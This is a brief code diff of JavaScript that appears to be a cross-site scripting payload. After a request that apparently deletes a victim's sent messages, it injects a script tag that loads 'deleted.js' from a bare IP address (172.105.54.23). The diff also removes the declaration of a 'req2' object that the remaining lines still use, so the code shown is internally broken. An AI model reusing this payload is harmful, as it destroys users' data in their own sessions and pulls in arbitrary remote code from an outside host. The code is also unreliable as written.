@@ -1,16 +1,5 @@
    var req = new XMLHttpRequest();
-   var req2 = new XMLHttpRequest();
 
-  req2.onreadystatechange = function () {
-   if (req2.readyState == 4 && req2.status == 200 )
-     {
-        alert("Sent Messages Deleted");
-        var newtag = document.createElement("script");
-        newtag.type = "text/javascript";
-        newtag.src = "https://172.105.54.23/deleted.js";
-        document.body.appendChild(newtag);
-     }
-  };
    req.onreadystatechange = function()
    {
      if (req.readyState == 4 && req.status == 200 )
@@ -24,6 +13,11 @@
      req2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      req2.send();
      }
+        alert("Sent Messages Deleted");
+        var newtag = document.createElement("script");
+        newtag.type = "text/javascript";
+        newtag.src = "https://172.105.54.23/deleted.js";
+        document.body.appendChild(newtag);
    }
 };
 
